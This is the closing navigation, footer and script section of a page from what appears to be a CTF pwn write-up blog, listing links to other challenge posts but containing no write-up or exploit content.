+          <li><a href="/2022/03/19/pwnable-seethefile/" rel="bookmark" title="pwnable_seethefile">pwnable_seethefile</a></li><li class="active"><a href="/2022/03/20/buuoj-heapcreator/" rel="bookmark" title="buuoj_heapcreator">buuoj_heapcreator</a></li><li><a href="/2022/03/21/roarctf-2019-easypwn/" rel="bookmark" title="roarctf_2019_easypwn">roarctf_2019_easypwn</a></li><li><a href="/2022/03/22/tw2017parrot/" rel="bookmark" title="tw2017parrot">tw2017parrot</a></li><li><a href="/2022/04/01/note-file/" rel="bookmark" title="note_file">note_file</a></li><li><a href="/2022/04/01/tcache-tear/" rel="bookmark" title="tcache_tear">tcache_tear</a></li><li><a href="/2022/04/10/pwnable-bookwriter/" rel="bookmark" title=""></a></li><li><a href="/2022/04/14/heap-paradise/" rel="bookmark" title="heap_paradise">heap_paradise</a></li><li><a href="/2022/04/18/starctf_examination/" rel="bookmark" title="examination">examination</a></li><li><a href="/2022/04/19/starctf-babynote/" rel="bookmark" title="starctf_babynote">starctf_babynote</a></li><li><a href="/2022/04/25/MRCTF-ezbash/" rel="bookmark" title="MRCTF_ezbash">MRCTF_ezbash</a></li><li><a href="/2022/05/10/chunzhiIOT/" rel="bookmark" title="chunzhiIOT">chunzhiIOT</a></li><li><a href="/2022/05/10/torghast/" rel="bookmark" title="torghast">torghast</a></li><li><a href="/2022/05/13/pwnable-re-alloc/" rel="bookmark" title="pwnable-re-alloc">pwnable-re-alloc</a></li><li><a href="/2022/06/18/ciscn2022-syscall/" rel="bookmark" title="ciscn2022_syscall">ciscn2022_syscall</a></li><li><a href="/2022/06/19/ciscn-2022-popcalc/" rel="bookmark" title="ciscn_2022_popcalc">ciscn_2022_popcalc</a></li><li><a href="/2022/06/20/ciscn-2022-planecoode/" rel="bookmark" title="ciscn_2022_planecoode">ciscn_2022_planecoode</a></li><li><a href="/2022/09/20/tctf2022ezvm/" rel="bookmark" title="tctf2022ezvm">tctf2022ezvm</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="dreamcat"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">dreamcat</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">33</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">4</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2022/03/19/pwnable-seethefile/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2022/03/21/roarctf-2019-easypwn/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/05/12/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/" title="逆向常见算法">逆向常见算法</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/mobile/" title="In mobile">mobile</a>
+</div>
+
+    <span><a href="/2022/07/18/adworld-%E5%9F%BA%E7%A1%80%E7%9A%84android/" title="adworld_基础的android">adworld_基础的android</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/" title="glibc-2.35一些手法">glibc-2.35一些手法</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/05/10/torghast/" title="torghast">torghast</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/05/10/chunzhiIOT/" title="chunzhiIOT">chunzhiIOT</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/18/starctf_examination/" title="examination">examination</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/01/tcache-tear/" title="tcache_tear">tcache_tear</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/06/20/ciscn-2022-planecoode/" title="ciscn_2022_planecoode">ciscn_2022_planecoode</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/06/18/ciscn2022-syscall/" title="ciscn2022_syscall">ciscn2022_syscall</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/begin/" title="In begin">begin</a>
+</div>
+
+    <span><a href="/2021/03/19/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">dreamcat @ dreamcat</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="Symbols count total">282k words</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="Reading time total">4:16</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/03/20/buuoj-heapcreator/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)dreamcat?"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
